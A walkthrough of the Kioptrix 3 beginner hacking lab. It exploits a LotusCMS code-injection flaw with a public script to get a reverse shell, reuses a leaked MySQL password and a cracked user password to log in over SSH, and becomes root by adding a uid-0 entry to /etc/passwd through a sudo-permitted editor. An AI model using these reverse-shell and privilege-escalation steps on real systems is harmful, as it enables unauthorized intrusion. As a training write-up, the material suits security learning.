Found LotusCMS at http://kioptrix3.com/index.php?system=Admin

I research about that cms exploit and found RCE exploit:

https://github.com/Hood3dRob1n/LotusCMS-Exploit

So, I download it and exploit it:

./exploit.sh kioptrix3.com /

Path found, now to check for vuln....

</html>Hood3dRob1n
Regex found, site is vulnerable to PHP Code Injection!

About to try and inject reverse shell....
what IP to use?
10.0.2.4
What PORT?
4444

OK, open your local listener and choose the method for back connect: 
1) NetCat -e
2) NetCat /dev/tcp
3) NetCat Backpipe
4) NetCat FIFO
5) Exit
#? 1


Need to listen with nc:

nc -lvnp 4444

Boom! I got reverse shell

After running linpeas.sh, I found database password:

        $GLOBALS["gallarific_mysql_password"] = "fuckeyou";

password = fuckeyou

I login into mysql with above password:

www-data@Kioptrix3:/tmp$ mysql -u root -p
Enter password:

Decrypted Version Of "loneferret" password:

password - starwars


I already found that user loneferret has ssh login so I tried login with:

Username - loneferret
Password - starwars

Boom! I got user access.

Priv Escalation 

I execute sudo -l with user loneferret. Found that we can use ht editor as root with no password:

loneferret@Kioptrix3:~$ sudo -l
User loneferret may run the following commands on this host:
    (root) NOPASSWD: !/usr/bin/su
    (root) NOPASSWD: /usr/local/bin/ht


So, I add new user lol as root priv:

1st step:

Generate openssl key:

┌──(root㉿kali)-[~/Desktop/tools/linPEAS]
└─# openssl passwd -1 -salt lol pass123  
$1$lol$KiPrOjhyjfhWUcIJnDuJd/



2nd step:

added into /etc/passwd with ht editor

loneferret@Kioptrix3:~$ sudo ht

Press F3 to open file

find and open /etc/passwd

add below code at the end of the line:

lol:$1$lol$KiPrOjhyjfhWUcIJnDuJd/:0:0:/root/root:/bin/bash

Then press F2 for save file

Ctrl+C for exit editor.

Final Step:

loneferret@Kioptrix3:~$ su lol
Password:pass123
# whoami
root

Final Flag:

root@Kioptrix3:/root# cat Congrats.txt 
Good for you for getting here.
Regardless of the matter (staying within the spirit of the game of course)
you got here, congratulations are in order. Wasn't that bad now was it.

Went in a different direction with this VM. Exploit based challenges are
nice. Helps workout that information gathering part, but sometimes we
need to get our hands dirty in other things as well.
Again, these VMs are beginner and not intented for everyone. 
Difficulty is relative, keep that in mind.

The object is to learn, do some research and have a little (legal)
fun in the process.


I hope you enjoyed this third challenge.
